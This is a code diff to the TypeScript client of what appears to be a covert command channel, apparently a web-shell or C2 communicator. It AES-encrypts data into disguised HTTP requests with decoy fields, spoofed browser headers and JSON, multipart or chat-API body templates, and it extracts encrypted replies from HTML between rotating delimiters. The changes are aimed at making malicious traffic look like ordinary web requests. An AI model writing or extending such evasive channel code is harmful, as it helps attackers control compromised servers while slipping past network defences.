@@ -15,7 +15,14 @@
  */
 import { randomInt } from "node:crypto";
 
-import { loadProfile, pickRequestShape, profileRequests, type SiteProfile } from "../core/site-profile.js";
+import {
+  inferBodyTemplateContentType,
+  loadProfile,
+  pickRequestShape,
+  profileRequests,
+  profileTemplates,
+  type SiteProfile,
+} from "../core/site-profile.js";
 import { postRaw } from "./http.js";
 import { randomString } from "./crypto.js";
 import {
@@ -26,9 +33,12 @@ import {
 } from "./mimic-codecs.js";
 import {
   buildFormBody,
+  buildJsonBody,
   deriveAesKey,
   encryptField,
-  extractFromHtml,
+  extractBetween,
+  renderBodyTemplate,
+  templateDelimiters,
   decryptField,
   renderFieldValue,
 } from "./mimic-shared.js";
@@ -104,6 +114,7 @@ async function roundTrip(
   const shape = pickRequestShape(ctx.profile ? profileRequests(ctx.profile) : []);
   const secretField = shape?.secretField ?? ctx.pass;
   const secretIn = shape?.secretIn ?? "body";
+  const bodyStyle = shape?.bodyStyle ?? "form";
   const cipher = encryptField(Buffer.from(plaintext, "utf8"), ctx.aesKey, ctx.cipher);
   const decoys = (shape?.fields ?? []).map((f) => ({
     name: f.name,
@@ -119,11 +130,38 @@ async function roundTrip(
   } else if (secretIn === "header") {
     // base64 is legal in header values as-is — no URL-encoding there
     extraHeaders[secretField] = cipher;
-    body = buildFormBody(decoys);
+    body = bodyStyle === "json" ? buildJsonBody(decoys) : buildFormBody(decoys);
+  } else if (shape?.bodyTemplate) {
+    // a full body template (chat-API JSON / GraphQL / XML / multipart…):
+    // the ciphertext goes where {{payload}} sits, decoys ride {{macros}}
+    body = renderBodyTemplate(shape.bodyTemplate, cipher);
   } else {
-    body = buildFormBody([...decoys, { name: secretField, value: cipher }]);
+    body =
+      bodyStyle === "json"
+        ? buildJsonBody([...decoys, { name: secretField, value: cipher }])
+        : buildFormBody([...decoys, { name: secretField, value: cipher }]);
   }
-  const headers = buildHeaders({ ...BROWSER_HEADERS, ...extraHeaders }, req.common);
+  const baseHeaders: Record<string, string> = { ...BROWSER_HEADERS };
+  // query mode: an empty body must not claim a form Content-Type
+  if (secretIn === "query") delete baseHeaders["Content-Type"];
+  else if (shape?.bodyTemplate) {
+    // explicit headers win (merged below); otherwise infer from the body —
+    // a multipart template's boundary comes from its first delimiter line
+    const t = shape.bodyTemplate.trimStart();
+    if (t.startsWith("--")) {
+      const boundary = t.split(/\r?\n/, 1)[0]!.slice(2);
+      baseHeaders["Content-Type"] = `multipart/form-data; boundary=${boundary}`;
+    } else {
+      // shared with the custom build's body-read allowlist derivation
+      const inferred = inferBodyTemplateContentType(shape.bodyTemplate);
+      if (inferred) baseHeaders["Content-Type"] = inferred;
+      else delete baseHeaders["Content-Type"];
+    }
+  } else if (bodyStyle === "json") baseHeaders["Content-Type"] = "application/json";
+  const headers = buildHeaders(
+    { ...baseHeaders, ...extraHeaders, ...(shape?.headers ?? {}) },
+    req.common,
+  );
   let res;
   try {
     res = await postRaw(requestUrl, body, {
@@ -149,7 +187,18 @@ async function roundTrip(
       durationMs: res.durationMs,
     };
   }
-  const b64 = extractFromHtml(res.body.toString("utf8"), ctx.markers.left, ctx.markers.right);
+  const text = res.body.toString("utf8");
+  // try each cover template's delimiters — the server rotates templates, and
+  // {{payload}} templates have their own exact bounds (any content type)
+  const delimiters = templateDelimiters(
+    ctx.profile ? profileTemplates(ctx.profile) : [],
+    ctx.markers,
+  );
+  let b64: string | null = null;
+  for (const d of delimiters) {
+    b64 = extractBetween(text, d.left, d.right);
+    if (b64 !== null) break;
+  }
   if (b64 === null) {
     return {
       ok: false,
